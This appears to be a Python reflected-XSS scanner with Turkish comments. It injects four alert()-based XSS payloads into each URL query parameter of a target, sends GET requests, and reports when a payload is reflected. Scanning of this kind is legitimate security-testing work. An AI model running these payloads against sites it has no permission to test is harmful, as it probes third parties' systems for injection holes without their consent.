import requests
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup

# XSS Payload Listesi
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>"
]

def inject_payload(url, payload):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    for param in params:
        params[param] = payload

    new_query = urlencode(params, doseq=True)
    injected_url = parsed_url._replace(query=new_query).geturl()
    return injected_url


def check_xss(response_text, payload):
    return payload in response_text

# Taranacak URL'ler
def scan_xss(url):
    print(f"[*] Taranan URL: {url}")
    
    try:
        for payload in xss_payloads:
            injected_url = inject_payload(url, payload)
            print(f"[*] Test Edilen URL: {injected_url}")
            response = requests.get(injected_url)
            
            if response.status_code == 200:
                # HTML'yi temizleyip kontrol ediyoruz
                soup = BeautifulSoup(response.text, 'html.parser')
                cleaned_html = soup.prettify()
                
                if check_xss(cleaned_html, payload):
                    print(f"[!] XSS AÇIĞI BULUNDU! Payload: {payload}")
                    print(f"[!] Yanıtın Bulunduğu URL: {injected_url}")
                    break
            else:
                print(f"[!] Hata: {response.status_code}, URL: {injected_url}")
    
    except requests.exceptions.RequestException as e:
        print(f"[!] İstek Hatası: {e}")

if __name__ == "__main__":
    # Örnek URL (Burayı consol üzerinden dinamik olarakda alabilirsin.)
    url_to_scan = "http://example.com/index.php?search=test"
    
    scan_xss(url_to_scan)
